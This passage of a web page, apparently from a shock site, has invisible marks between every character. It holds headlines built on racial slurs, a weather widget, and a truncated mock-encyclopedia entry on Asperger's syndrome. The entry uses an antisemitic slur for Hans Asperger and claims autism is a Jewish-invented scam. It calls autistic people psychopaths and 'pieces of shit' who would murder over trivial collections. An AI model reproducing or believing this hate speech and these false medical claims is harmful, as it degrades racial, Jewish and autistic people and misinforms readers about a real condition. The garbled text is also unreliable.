S‚Äép‚Äéi‚Äéc‚Äé ‚ÄéR‚Äéu‚Äén‚Äés‚Äé ‚ÄéO‚Äév‚Äée‚Äér‚Äé ‚ÄéP‚Äér‚Äée‚Äég‚Äén‚Äéa‚Äén‚Äét‚Äé ‚ÄéM‚Äéu‚Äéd‚Äés‚Äéh‚Äéa‚Äér‚Äék‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéN‚Äée‚Äég‚Äér‚Äéo‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚ÄéT‚Äéh‚Äée‚Äéy‚Äé ‚ÄéA‚Äés‚Äék‚Äée‚Äéd‚Äé ‚ÄéH‚Äéi‚Äém‚Äé ‚Äét‚Äéo‚Äé ‚ÄéS‚Äét‚Äéo‚Äép‚Äé ‚ÄéS‚Äém‚Äéo‚Äék‚Äéi‚Äén‚Äég‚Äé.‚Äé


W‚Äéo‚Äém‚Äéa‚Äén‚Äé ‚ÄéF‚Äéi‚Äég‚Äéh‚Äét‚Äés‚Äé ‚Äéo‚Äéf‚Äéf‚Äé ‚ÄéT‚Äéa‚Äéc‚Äéo‚Äé ‚ÄéB‚Äée‚Äén‚Äéd‚Äée‚Äér‚Äé ‚Äéi‚Äén‚Äé ‚ÄéM‚Äéa‚Äén‚Äéh‚Äéa‚Äét‚Äét‚Äéa‚Äén‚Äé ‚ÄéA‚Äép‚Äéa‚Äér‚Äét‚Äém‚Äée‚Äén‚Äét‚Äé ‚ÄéC‚Äéo‚Äém‚Äép‚Äél‚Äée‚Äéx‚Äé ‚ÄéS‚Äét‚Äéa‚Äéi‚Äér‚Äéw‚Äée‚Äél‚Äél‚Äé.‚Äé


S‚Äép‚Äéi‚Äéc‚Äé ‚ÄéM‚ÄéS‚Äé-‚Äé1‚Äé3‚Äé ‚ÄéG‚Äéa‚Äén‚Äég‚Äé ‚ÄéM‚Äée‚Äém‚Äéb‚Äée‚Äér‚Äés‚Äé ‚ÄéW‚Äéh‚Äéo‚Äé ‚ÄéS‚Äéh‚Äéo‚Äét‚Äé ‚Äéu‚Äép‚Äé ‚ÄéS‚Äéu‚Äéb‚Äéw‚Äéa‚Äéy‚Äé ‚ÄéA‚Äér‚Äér‚Äée‚Äés‚Äét‚Äée‚Äéd‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äéo‚Äéu‚Äét‚Äé ‚ÄéB‚Äéa‚Äéi‚Äél‚Äé.‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé ‚ÄéW‚Äée‚Äéa‚Äét‚Äéh‚Äée‚Äér‚Äé.‚Äé

T‚Äéu‚Äée‚Äé ‚Äé2‚Äé3‚Äé ‚Äé|‚Äé ‚ÄéD‚Äéa‚Äéy‚Äé
7‚Äé8‚Äé¬∞‚Äé
2‚Äé%‚Äé
S‚Äé
1‚Äé2‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé ‚Äés‚Äék‚Äéi‚Äée‚Äés‚Äé.‚Äé ‚ÄéH‚Äéi‚Äég‚Äéh‚Äé ‚Äé7‚Äé8‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚ÄéS‚Äé ‚Äéa‚Äét‚Äé ‚Äé1‚Äé0‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé5‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé

H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
7‚Äé3‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
7‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
S‚Äéu‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
6‚Äé:‚Äé5‚Äé4‚Äé ‚Äéa‚Äém‚Äé
S‚Äéu‚Äén‚Äés‚Äée‚Äét‚Äé
8‚Äé:‚Äé0‚Äé2‚Äé ‚Äép‚Äém‚Äé
T‚Äéu‚Äée‚Äé ‚Äé2‚Äé3‚Äé ‚Äé|‚Äé ‚ÄéN‚Äéi‚Äég‚Äéh‚Äét‚Äé
6‚Äé4‚Äé¬∞‚Äé
1‚Äé8‚Äé%‚Äé
S‚Äé
1‚Äé1‚Äé
 ‚Äé
m‚Äép‚Äéh‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé ‚Äée‚Äéa‚Äér‚Äél‚Äéy‚Äé ‚Äéf‚Äéo‚Äél‚Äél‚Äéo‚Äéw‚Äée‚Äéd‚Äé ‚Äéb‚Äéy‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé ‚Äés‚Äék‚Äéi‚Äée‚Äés‚Äé ‚Äéo‚Äév‚Äée‚Äér‚Äén‚Äéi‚Äég‚Äéh‚Äét‚Äé.‚Äé ‚ÄéL‚Äéo‚Äéw‚Äé ‚Äé6‚Äé4‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚ÄéS‚Äé ‚Äéa‚Äét‚Äé ‚Äé1‚Äé0‚Äé ‚Äét‚Äéo‚Äé ‚Äé1‚Äé5‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé

H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
9‚Äé1‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
0‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
M‚Äéo‚Äéo‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
8‚Äé:‚Äé0‚Äé3‚Äé ‚Äép‚Äém‚Äé
F‚Äéu‚Äél‚Äél‚Äé ‚ÄéM‚Äéo‚Äéo‚Äén‚Äé
M‚Äéo‚Äéo‚Äén‚Äés‚Äée‚Äét‚Äé
6‚Äé:‚Äé3‚Äé6‚Äé ‚Äéa‚Äém‚Äé
W‚Äée‚Äéd‚Äé ‚Äé2‚Äé4‚Äé
A‚ÄéM‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äés‚Äé/‚ÄéP‚ÄéM‚Äé ‚ÄéS‚Äéu‚Äén‚Äé
8‚Äé5‚Äé¬∞‚Äé
/‚Äé6‚Äé9‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé2‚Äé5‚Äé
A‚ÄéM‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
8‚Äé4‚Äé¬∞‚Äé
/‚Äé7‚Äé1‚Äé¬∞‚Äé
3‚Äé6‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé2‚Äé6‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé1‚Äé¬∞‚Äé
/‚Äé7‚Äé1‚Äé¬∞‚Äé
4‚Äé8‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé2‚Äé7‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé/‚ÄéW‚Äéi‚Äén‚Äéd‚Äé
8‚Äé7‚Äé¬∞‚Äé
/‚Äé7‚Äé2‚Äé¬∞‚Äé
2‚Äé1‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé2‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé2‚Äé8‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé3‚Äé¬∞‚Äé
/‚Äé7‚Äé0‚Äé¬∞‚Äé
4‚Äé7‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé2‚Äé9‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé6‚Äé¬∞‚Äé
/‚Äé6‚Äé8‚Äé¬∞‚Äé
5‚Äé9‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé3‚Äé0‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé5‚Äé¬∞‚Äé
/‚Äé6‚Äé9‚Äé¬∞‚Äé
4‚Äé1‚Äé%‚Äé
S‚ÄéE‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé0‚Äé1‚Äé
A‚ÄéM‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé7‚Äé¬∞‚Äé
/‚Äé7‚Äé0‚Äé¬∞‚Äé
3‚Äé9‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé0‚Äé2‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé7‚Äé¬∞‚Äé
/‚Äé7‚Äé0‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé0‚Äé3‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé7‚Äé¬∞‚Äé
/‚Äé6‚Äé9‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé0‚Äé4‚Äé
S‚Äéc‚Äéa‚Äét‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé8‚Äé¬∞‚Äé
/‚Äé6‚Äé9‚Äé¬∞‚Äé
3‚Äé4‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé4‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé0‚Äé5‚Äé
A‚ÄéM‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äés‚Äé/‚ÄéP‚ÄéM‚Äé ‚ÄéS‚Äéu‚Äén‚Äé
8‚Äé7‚Äé¬∞‚Äé
/‚Äé6‚Äé9‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé4‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé0‚Äé6‚Äé
I‚Äés‚Äéo‚Äél‚Äéa‚Äét‚Äée‚Äéd‚Äé ‚ÄéT‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äét‚Äéo‚Äér‚Äém‚Äés‚Äé
8‚Äé8‚Äé¬∞‚Äé
/‚Äé6‚Äé8‚Äé¬∞‚Äé
3‚Äé4‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé0‚Äé7‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
8‚Äé7‚Äé¬∞‚Äé
/‚Äé6‚Äé8‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
S‚ÄéS‚ÄéE‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

C‚Äéu‚Äér‚Äér‚Äée‚Äén‚Äét‚Äé ‚Äét‚Äéh‚Äér‚Äée‚Äéa‚Äét‚Äé:‚Äé ‚ÄéB‚Äér‚Äéi‚Äét‚Äéf‚Äéa‚Äég‚Äés‚Äé.‚Äé ‚Äéüßê

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

A‚Äés‚Äép‚Äée‚Äér‚Äég‚Äée‚Äér‚Äé'‚Äés‚Äé ‚ÄéS‚Äéy‚Äén‚Äéd‚Äér‚Äéo‚Äém‚Äée‚Äé
A‚Äés‚Äés‚Äé ‚ÄéB‚Äéu‚Äér‚Äég‚Äée‚Äér‚Äés‚Äé ‚ÄéS‚Äéy‚Äén‚Äéd‚Äér‚Äéo‚Äém‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äé ‚Äét‚Äée‚Äér‚Äém‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äég‚Äér‚Äée‚Äéw‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéw‚Äéi‚Äél‚Äéd‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéc‚Äéo‚Äém‚Äép‚Äée‚Äét‚Äéi‚Äét‚Äéi‚Äév‚Äée‚Äé ‚Äé""‚ÄéP‚Äéu‚Äéb‚Äél‚Äéi‚Äés‚Äéh‚Äé ‚Äéo‚Äér‚Äé ‚ÄéP‚Äée‚Äér‚Äéi‚Äés‚Äéh‚Äé""‚Äé ‚Äém‚Äée‚Äéd‚Äéi‚Äéc‚Äéa‚Äél‚Äé ‚Äér‚Äée‚Äés‚Äée‚Äéa‚Äér‚Äéc‚Äéh‚Äé ‚Äée‚Äés‚Äét‚Äéa‚Äéb‚Äél‚Äéi‚Äés‚Äéh‚Äém‚Äée‚Äén‚Äét‚Äé.‚Äé ‚ÄéA‚Äé ‚Äéc‚Äée‚Äér‚Äét‚Äéa‚Äéi‚Äén‚Äé ‚Äék‚Äéi‚Äék‚Äée‚Äé ‚Äén‚Äéa‚Äém‚Äée‚Äéd‚Äé ‚ÄéD‚Äér‚Äé.‚Äé ‚ÄéH‚Äéa‚Äén‚Äés‚Äé ‚ÄéA‚Äés‚Äép‚Äée‚Äér‚Äég‚Äée‚Äér‚Äé,‚Äé ‚Äéd‚Äéu‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚ÄéJ‚Äée‚Äéw‚Äé ‚Äéi‚Äén‚Äés‚Äét‚Äéi‚Äén‚Äéc‚Äét‚Äé ‚Äét‚Äéo‚Äé ‚Äém‚Äéa‚Äék‚Äée‚Äé ‚Äéu‚Äép‚Äé ‚Äén‚Äéo‚Äén‚Äée‚Äéx‚Äéi‚Äés‚Äét‚Äée‚Äén‚Äét‚Äé ‚Äéd‚Äéi‚Äés‚Äée‚Äéa‚Äés‚Äée‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äés‚Äéc‚Äéa‚Äém‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äéw‚Äéi‚Äés‚Äée‚Äé ‚Äén‚Äéo‚Äér‚Äém‚Äéa‚Äél‚Äé ‚Äép‚Äée‚Äéo‚Äép‚Äél‚Äée‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äém‚Äéo‚Äén‚Äée‚Äéy‚Äé,‚Äé ‚Äéh‚Äéa‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéb‚Äér‚Äéi‚Äél‚Äél‚Äéi‚Äéa‚Äén‚Äét‚Äé ‚Äéi‚Äéd‚Äée‚Äéa‚Äé ‚Äéo‚Äéf‚Äé ‚Äép‚Äéu‚Äét‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äél‚Äél‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äép‚Äés‚Äéy‚Äéc‚Äéh‚Äéo‚Äép‚Äéa‚Äét‚Äéh‚Äés‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äél‚Äéi‚Äét‚Äét‚Äél‚Äée‚Äé ‚Äéo‚Äér‚Äé ‚Äén‚Äéo‚Äé ‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äél‚Äé ‚Äés‚Äék‚Äéi‚Äél‚Äél‚Äés‚Äé ‚Äéi‚Äén‚Äé ‚Äéo‚Äén‚Äée‚Äé ‚Äég‚Äér‚Äéo‚Äéu‚Äép‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéd‚Äéi‚Äéa‚Äég‚Äén‚Äéo‚Äés‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äém‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äéa‚Äé ‚Äén‚Äée‚Äéw‚Äé ‚Äém‚Äée‚Äén‚Äét‚Äéa‚Äél‚Äé ‚Äéi‚Äél‚Äél‚Äén‚Äée‚Äés‚Äés‚Äé:‚Äé ‚ÄéA‚ÄéU‚ÄéT‚ÄéI‚ÄéS‚ÄéM‚Äé.‚Äé ‚Äé(‚ÄéT‚Äéh‚Äée‚Äé ‚Äén‚Äéa‚Äém‚Äée‚Äé ‚Äéi‚Äét‚Äés‚Äée‚Äél‚Äéf‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äé ‚Äée‚Äéu‚Äép‚Äéh‚Äée‚Äém‚Äéi‚Äés‚Äém‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéw‚Äéh‚Äéa‚Äét‚Äé ‚Äéh‚Äée‚Äé ‚Äéc‚Äéa‚Äél‚Äél‚Äée‚Äéd‚Äé ‚Äé""‚ÄéA‚Äéu‚Äét‚Äéi‚Äés‚Äét‚Äéi‚Äéc‚Äé ‚ÄéS‚Äéo‚Äéc‚Äéi‚Äéo‚Äép‚Äéa‚Äét‚Äéh‚Äés‚Äé""‚Äé)‚Äé.‚Äé ‚ÄéL‚Äéi‚Äék‚Äée‚Äé ‚Äéa‚Äél‚Äél‚Äé ‚Äém‚Äée‚Äén‚Äét‚Äéa‚Äél‚Äé ‚Äéi‚Äél‚Äél‚Äén‚Äée‚Äés‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äér‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äéb‚Äés‚Äéo‚Äél‚Äéu‚Äét‚Äée‚Äél‚Äéy‚Äé ‚Äén‚Äéo‚Äé ‚Äép‚Äéh‚Äéy‚Äés‚Äéi‚Äéc‚Äéa‚Äél‚Äé ‚Äée‚Äév‚Äéi‚Äéd‚Äée‚Äén‚Äéc‚Äée‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéi‚Äét‚Äé ‚Äéa‚Äéc‚Äét‚Äéu‚Äéa‚Äél‚Äél‚Äéy‚Äé ‚Äée‚Äéx‚Äéi‚Äés‚Äét‚Äés‚Äé,‚Äé ‚Äéb‚Äéu‚Äét‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äée‚Äéx‚Äép‚Äée‚Äéc‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äép‚Äéa‚Äér‚Äée‚Äén‚Äét‚Äés‚Äé ‚Äéi‚Äét‚Äé ‚Äér‚Äée‚Äép‚Äél‚Äéa‚Äéc‚Äée‚Äés‚Äé ‚ÄéD‚Äéo‚Äéw‚Äén‚Äé'‚Äés‚Äé ‚ÄéS‚Äéy‚Äén‚Äéd‚Äér‚Äéo‚Äém‚Äée‚Äé ‚Äéa‚Äés‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äén‚Äéu‚Äém‚Äéb‚Äée‚Äér‚Äé ‚Äéo‚Äén‚Äée‚Äé ‚Äéd‚Äéi‚Äés‚Äéo‚Äér‚Äéd‚Äée‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äéy‚Äé ‚Äéf‚Äée‚Äéa‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äéc‚Äéh‚Äéi‚Äél‚Äéd‚Äé ‚Äéw‚Äéi‚Äél‚Äél‚Äé ‚Äéd‚Äée‚Äév‚Äée‚Äél‚Äéo‚Äép‚Äé.‚Äé ‚ÄéI‚Äét‚Äé ‚Äéd‚Äéi‚Äéf‚Äéf‚Äée‚Äér‚Äés‚Äé ‚Äéf‚Äér‚Äéo‚Äém‚Äé ‚ÄéH‚Äéi‚Äég‚Äéh‚Äé ‚ÄéF‚Äéu‚Äén‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äéi‚Äén‚Äég‚Äé ‚ÄéA‚Äéu‚Äét‚Äéi‚Äés‚Äém‚Äé ‚Äéi‚Äén‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéi‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äéc‚Äéo‚Äén‚Äés‚Äéi‚Äéd‚Äée‚Äér‚Äée‚Äéd‚Äé ‚Äéu‚Äét‚Äét‚Äée‚Äér‚Äé ‚Äéb‚Äéu‚Äél‚Äél‚Äés‚Äéh‚Äéi‚Äét‚Äé ‚Äéb‚Äée‚Äéf‚Äéo‚Äér‚Äée‚Äé ‚Äéi‚Äét‚Äé ‚Äéw‚Äéa‚Äés‚Äé ‚Äép‚Äéo‚Äép‚Äéu‚Äél‚Äéa‚Äér‚Äé ‚Äét‚Äéo‚Äé ‚Äéi‚Äén‚Äév‚Äée‚Äén‚Äét‚Äé ‚Äép‚Äés‚Äéy‚Äéc‚Äéh‚Äéi‚Äéa‚Äét‚Äér‚Äéi‚Äéc‚Äé ‚Äéd‚Äéi‚Äés‚Äéo‚Äér‚Äéd‚Äée‚Äér‚Äés‚Äé.‚Äé

A‚Äés‚Äép‚Äée‚Äér‚Äég‚Äée‚Äér‚Äé-‚Äém‚Äéo‚Äén‚Äés‚Äét‚Äée‚Äér‚Äés‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äém‚Äéo‚Äés‚Äét‚Äé ‚Äés‚Äée‚Äél‚Äéf‚Äé-‚Äéc‚Äée‚Äén‚Äét‚Äée‚Äér‚Äée‚Äéd‚Äé,‚Äé ‚Äés‚Äée‚Äél‚Äéf‚Äéi‚Äés‚Äéh‚Äé ‚Äép‚Äéi‚Äée‚Äéc‚Äée‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äés‚Äéh‚Äéi‚Äét‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äép‚Äél‚Äéa‚Äén‚Äée‚Äét‚Äé.‚Äé ‚ÄéD‚Äée‚Äév‚Äéo‚Äéi‚Äéd‚Äé ‚Äéo‚Äéf‚Äé ‚Äée‚Äém‚Äép‚Äéa‚Äét‚Äéh‚Äéy‚Äé,‚Äé ‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äél‚Äé ‚Äér‚Äée‚Äéa‚Äés‚Äéo‚Äén‚Äéi‚Äén‚Äég‚Äé,‚Äé ‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äél‚Äé ‚Äéc‚Äéo‚Äén‚Äét‚Äée‚Äéx‚Äét‚Äé,‚Äé ‚Äéo‚Äér‚Äé ‚Äés‚Äée‚Äél‚Äéf‚Äé-‚Äéa‚Äéw‚Äéa‚Äér‚Äée‚Äén‚Äée‚Äés‚Äés‚Äé,‚Äé ‚Äét‚Äéh‚Äée‚Äéy‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äés‚Äéo‚Äéc‚Äéi‚Äéo‚Äép‚Äéa‚Äét‚Äéh‚Äés‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äéa‚Äén‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äéd‚Äée‚Äéf‚Äéi‚Äén‚Äéi‚Äét‚Äéi‚Äéo‚Äén‚Äé,‚Äé ‚Äéw‚Äéh‚Äéo‚Äé ‚Äél‚Äéi‚Äév‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äéc‚Äéo‚Äél‚Äél‚Äée‚Äéc‚Äét‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéc‚Äéa‚Äét‚Äéa‚Äél‚Äéo‚Äég‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äéi‚Äén‚Äég‚Äél‚Äée‚Äés‚Äés‚Äé ‚Äéi‚Äét‚Äée‚Äém‚Äés‚Äé ‚Äél‚Äéi‚Äék‚Äée‚Äé ‚Äéb‚Äéa‚Äér‚Äéc‚Äéo‚Äéd‚Äée‚Äés‚Äé,‚Äé ‚Äéb‚Äéo‚Äét‚Äét‚Äél‚Äée‚Äét‚Äéo‚Äép‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äép‚Äél‚Äéa‚Äés‚Äét‚Äéi‚Äéc‚Äé ‚Äéc‚Äér‚Äéa‚Äép‚Äé ‚Äéb‚Äéy‚Äé ‚Äéa‚Äén‚Äéy‚Äé ‚Äém‚Äée‚Äéa‚Äén‚Äés‚Äé ‚Äép‚Äéo‚Äés‚Äés‚Äéi‚Äéb‚Äél‚Äée‚Äé ‚Äéi‚Äén‚Äéc‚Äél‚Äéu‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äém‚Äéu‚Äér‚Äéd‚Äée‚Äér‚Äé.‚Äé ‚ÄéC‚Äéo‚Äém‚Äém‚Äéo‚Äén‚Äé ‚Äés‚Äéy‚Äém‚Äép‚Äét‚Äéo‚Äém‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéA‚Äés‚Äép‚Äée‚Äér‚Äég‚Äée‚Äér‚Äé'‚Äés‚Äé ‚ÄéS‚Äéy‚Äén‚Äéd‚Äér‚Äéo‚Äém‚Äée‚Äé ‚Äéi‚Äén‚Äéc‚Äél‚Äéu‚Äéd‚Äée‚Äé ‚Äéf‚Äéa‚Äéi‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äét‚Äé ‚Äés‚Äéo‚Äéc‚Äéi‚Äéa‚Äél‚Äé ‚Äéi‚Äén‚Äét‚Äée‚Äér‚Äéa‚Äéc‚Äét‚Äéi‚Äéo‚Äén‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äée‚Äém‚Äép‚Äéa‚Äét‚Äéh‚Äéy‚Äé,‚Äé ‚Äéf‚Äéa‚Äéi‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äét‚Äé ‚Äéc‚Äéo‚Äém‚Äém‚Äéu‚Äén‚Äéi‚Äéc‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äé,‚Äé ‚Äéf‚Äéa‚Äéi‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äét‚Äé ‚Äég‚Äée‚Äét‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äé ‚Äéj‚Äéo‚Äéb‚Äé,‚Äé ‚Äéf‚Äéa‚Äéi‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äét‚Äé ‚Äél‚Äéi‚Äéf‚Äée‚Äé,‚Äé ‚Äéf‚Äéa‚Äéi‚Äél‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äét‚Äé ‚Äéh‚Äéy‚Äég‚Äéi‚Äée‚Äén‚Äée‚Äé,‚Äé ‚Äéb‚Äée‚Äéc‚Äéo‚Äém‚Äéi‚Äén‚Äég‚Äé ‚Äéo‚Äéb‚Äés‚Äée‚Äés‚Äés‚Äée‚Äéd‚Äé 